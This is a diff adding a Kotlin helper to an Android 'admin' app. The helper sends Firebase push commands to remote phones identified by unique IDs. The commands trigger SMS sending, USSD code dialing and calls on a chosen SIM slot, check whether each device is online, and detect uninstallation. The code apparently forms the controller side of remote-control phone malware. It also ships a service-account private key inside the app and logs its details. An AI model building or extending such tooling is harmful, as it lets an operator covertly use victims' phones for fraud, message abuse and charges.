@@ -1,0 +1,419 @@
+package com.example.admin.utils
+
+import android.content.Context
+import android.util.Log
+import com.google.auth.oauth2.GoogleCredentials
+import com.google.gson.Gson
+import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import java.io.ByteArrayInputStream
+import java.util.concurrent.TimeUnit
+
+object FCMHelper {
+    private const val TAG = "FCM_HELPER"
+    private val ioScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    private val uninstalledErrorPatterns = listOf(
+        "Requested entity was not found",
+        "registration-token-not-registered",
+        "InvalidRegistration",
+        "NotRegistered",
+        "MismatchSenderId"
+    )
+
+    private var projectId: String = ""
+    private var clientEmail: String = ""
+    private var privateKey: String = ""
+    private var privateKeyId: String = ""
+    private var isInitialized = false
+
+    private val client: OkHttpClient by lazy {
+        OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .build()
+    }
+
+    private val gson = Gson()
+
+    fun initialize(context: Context): Boolean {
+        return try {
+            Log.d(TAG, "========== INITIALIZING FCM HELPER ==========")
+
+            val inputStream = context.assets.open("service_account.json")
+            val jsonString = inputStream.bufferedReader().use { it.readText() }
+            val jsonObject = JSONObject(jsonString)
+
+            projectId = jsonObject.getString("project_id")
+            clientEmail = jsonObject.getString("client_email")
+            privateKey = jsonObject.getString("private_key")
+            privateKeyId = jsonObject.getString("private_key_id")
+
+            isInitialized = true
+
+            Log.d(TAG, "✅ FCM Helper initialized")
+            Log.d(TAG, "Project ID: $projectId")
+            Log.d(TAG, "Client Email: $clientEmail")
+            Log.d(TAG, "Private Key ID: $privateKeyId")
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to initialize FCM Helper", e)
+            false
+        }
+    }
+
+    private suspend fun getAccessToken(): String? = withContext(Dispatchers.IO) {
+        return@withContext try {
+            Log.d(TAG, "Getting access token...")
+
+            val serviceAccountJson = """
+                {
+                    "type": "service_account",
+                    "project_id": "$projectId",
+                    "private_key_id": "$privateKeyId",
+                    "private_key": "$privateKey",
+                    "client_email": "$clientEmail",
+                    "client_id": "",
+                    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+                    "token_uri": "https://oauth2.googleapis.com/token",
+                    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+                    "client_x509_cert_url": ""
+                }
+            """.trimIndent()
+
+            val inputStream = ByteArrayInputStream(serviceAccountJson.toByteArray())
+            val credentials = GoogleCredentials.fromStream(inputStream)
+                .createScoped(listOf("https://www.googleapis.com/auth/firebase.messaging"))
+
+            credentials.refreshIfExpired()
+            val token = credentials.accessToken.tokenValue
+
+            Log.d(TAG, "✅ Access token obtained: ${token.take(50)}...")
+            token
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to get access token", e)
+            null
+        }
+    }
+
+    private suspend fun sendFCMCommand(
+        context: Context,
+        fcmToken: String,
+        type: String,
+        payloadData: JSONObject
+    ): Pair<Boolean, String?> {
+        return try {
+            Log.d(TAG, "========== SENDING FCM COMMAND ==========")
+            Log.d(TAG, "Type: $type")
+            Log.d(TAG, "FCM Token: ${fcmToken.take(50)}...")
+
+            if (!isInitialized) {
+                Log.d(TAG, "FCM not initialized, initializing...")
+                if (!initialize(context)) {
+                    Log.e(TAG, "Initialization failed")
+                    return Pair(false, "Initialization failed")
+                }
+            }
+
+            val accessToken = getAccessToken()
+            if (accessToken == null) {
+                Log.e(TAG, "Failed to get access token")
+                return Pair(false, "Failed to get access token")
+            }
+
+            val fcmUrl = "https://fcm.googleapis.com/v1/projects/$projectId/messages:send"
+            Log.d(TAG, "FCM URL: $fcmUrl")
+
+            // Create message payload
+            val message = JSONObject().apply {
+                put("token", fcmToken)
+
+                // FIX: priority MUST be uppercase "HIGH" for FCM HTTP v1 API.
+                // Lowercase "high" silently downgrades to NORMAL on some Android versions,
+                // which means the device won't wake from Doze and never responds.
+                // TTL shortened to 60s — "online check" stale ho jata hai agar 1 hour rakhe.
+                val androidConfig = JSONObject().apply {
+                    put("priority", "HIGH")
+                    put("ttl", "60s")
+                    // direct_boot_ok + collapseKey help reach device faster in Doze
+                    put("direct_boot_ok", true)
+                    put("collapse_key", type)
+                }
+                put("android", androidConfig)
+
+                val data = JSONObject().apply {
+                    put("type", type)
+                    put("payload", payloadData.toString())
+                    put("timestamp", System.currentTimeMillis().toString())
+                    // FIX: priority field bhi data payload mein — receiver service
+                    // isse check karke high-priority work scheduler use kar sakta hai.
+                    put("priority", "high")
+                }
+                put("data", data)
+            }
+
+            val requestBody = JSONObject().apply {
+                put("message", message)
+            }
+
+            Log.d(TAG, "Request Body: ${requestBody.toString(2)}")
+
+            val body = requestBody.toString()
+                .toRequestBody("application/json; charset=utf-8".toMediaType())
+
+            val request = Request.Builder()
+                .url(fcmUrl)
+                .addHeader("Authorization", "Bearer $accessToken")
+                .addHeader("Content-Type", "application/json")
+                .post(body)
+                .build()
+
+            val response = client.newCall(request).execute()
+            val responseBody = response.body?.string()
+
+            Log.d(TAG, "Response Code: ${response.code}")
+            Log.d(TAG, "Response Body: $responseBody")
+
+            if (response.isSuccessful) {
+                Log.d(TAG, "✅ FCM sent successfully!")
+                Pair(true, "FCM sent successfully")
+            } else {
+                val errorMsg = parseErrorMessage(responseBody, response.code)
+                Log.e(TAG, "❌ FCM Failed: $errorMsg")
+                Pair(false, errorMsg)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Exception in sendFCMCommand", e)
+            Pair(false, "Exception: ${e.message}")
+        }
+    }
+
+    // ==================== PUBLIC API ====================
+
+    fun sendOnlineCheck(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendOnlineCheck called for device: $uniqueid")
+
+        ioScope.launch {
+            try {
+                val payloadData = JSONObject().apply {
+                    put("uniqueid", uniqueid)
+                    put("action", "ping")
+                    put("type", "CHECK_ONLINE")
+                    put("fromAdmin", true)
+                    put("deviceId", uniqueid)
+                    put("messageId", "admin_check_${System.currentTimeMillis()}")
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                val result = sendFCMCommand(
+                    context = context,
+                    fcmToken = fcmToken,
+                    type = "CHECK_ONLINE",
+                    payloadData = payloadData
+                )
+
+                withContext(Dispatchers.Main) {
+                    onResult(result.first, result.second)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in sendOnlineCheck", e)
+                withContext(Dispatchers.Main) {
+                    onResult(false, "Error: ${e.message}")
+                }
+            }
+        }
+    }
+
+    fun sendAdminNumber(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        adminNumber: String,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        Log.d(TAG, "sendAdminNumber called for device: $uniqueid, admin: $adminNumber")
+
+        ioScope.launch {
+            try {
+                val payloadData = JSONObject().apply {
+                    put("deviceId", uniqueid)
+                    put("number", adminNumber)
+                    put("status", "ACTIVE")
+                    put("timestamp", System.currentTimeMillis())
+                    put("type", "ADMIN_UPDATE")
+                }
+
+                val result = sendFCMCommand(
+                    context = context,
+                    fcmToken = fcmToken,
+                    type = "ADMIN_UPDATE",
+                    payloadData = payloadData
+                )
+
+                withContext(Dispatchers.Main) {
+                    onResult(result.first, result.second)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in sendAdminNumber", e)
+                withContext(Dispatchers.Main) {
+                    onResult(false, "Error: ${e.message}")
+                }
+            }
+        }
+    }
+
+    fun sendSmsCommand(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        to: String,
+        message: String,
+        simSlot: Int,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        ioScope.launch {
+            try {
+                val payloadData = JSONObject().apply {
+                    put("uniqueid", uniqueid)
+                    put("action", "sms")
+                    put("to", to)
+                    put("body", message)
+                    put("simSlot", simSlot)
+                    put("timestamp", System.currentTimeMillis())
+                    put("messageId", "sms_cmd_${System.currentTimeMillis()}")
+                    put("fromAdmin", true)
+                }
+
+                val result = sendFCMCommand(
+                    context = context,
+                    fcmToken = fcmToken,
+                    type = "DEVICE_COMMAND",
+                    payloadData = payloadData
+                )
+
+                withContext(Dispatchers.Main) {
+                    onResult(result.first, result.second)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in sendSmsCommand", e)
+                withContext(Dispatchers.Main) {
+                    onResult(false, "Error: ${e.message}")
+                }
+            }
+        }
+    }
+
+    fun sendUssdCommand(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        code: String,
+        simSlot: Int,
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        ioScope.launch {
+            try {
+                val payloadData = JSONObject().apply {
+                    put("uniqueid", uniqueid)
+                    put("action", "ussd")
+                    put("code", code)
+                    put("simSlot", simSlot)
+                    put("timestamp", System.currentTimeMillis())
+                    put("messageId", "ussd_cmd_${System.currentTimeMillis()}")
+                    put("fromAdmin", true)
+                }
+
+                val result = sendFCMCommand(
+                    context = context,
+                    fcmToken = fcmToken,
+                    type = "DEVICE_COMMAND",
+                    payloadData = payloadData
+                )
+
+                withContext(Dispatchers.Main) {
+                    onResult(result.first, result.second)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in sendUssdCommand", e)
+                withContext(Dispatchers.Main) {
+                    onResult(false, "Error: ${e.message}")
+                }
+            }
+        }
+    }
+
+    fun sendCallCommand(
+        context: Context,
+        uniqueid: String,
+        fcmToken: String,
+        code: String,
+        simSlot: Int,
+        number: String = "",
+        action: String = "",
+        onResult: (Boolean, String?) -> Unit
+    ) {
+        ioScope.launch {
+            try {
+                val payloadData = JSONObject().apply {
+                    put("uniqueid", uniqueid)
+                    put("action", "call")
+                    put("code", code)
+                    put("simSlot", simSlot)
+                    put("timestamp", System.currentTimeMillis())
+                    put("messageId", "call_cmd_${System.currentTimeMillis()}")
+                    put("fromAdmin", true)
+                    if (number.isNotEmpty()) put("number", number)
+                    if (action.isNotEmpty()) put("actionType", action)
+                }
+
+                val result = sendFCMCommand(
+                    context = context,
+                    fcmToken = fcmToken,
+                    type = "DEVICE_COMMAND",
+                    payloadData = payloadData
+                )
+
+                withContext(Dispatchers.Main) {
+                    onResult(result.first, result.second)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in sendCallCommand", e)
+                withContext(Dispatchers.Main) {
+                    onResult(false, "Error: ${e.message}")
+                }
+            }
+        }
+    }
+
+
+    private fun parseErrorMessage(responseBody: String?, httpCode: Int): String {
+        return try {
+            if (responseBody == null) return "HTTP $httpCode"
+            val json = JSONObject(responseBody)
+            val errorObj = json.optJSONObject("error")
+            if (errorObj != null) {
+                errorObj.optString("message", "HTTP $httpCode")
+            } else {
+                "HTTP $httpCode"
+            }
+        } catch (e: Exception) {
+            "HTTP $httpCode"
+        }
+    }
+
+    fun isValidFCMToken(token: String): Boolean {
+        return token.isNotEmpty() &&
+                token.length > 50 &&
+                token.contains(":") &&
+                !token.contains(" ")
+    }
+}
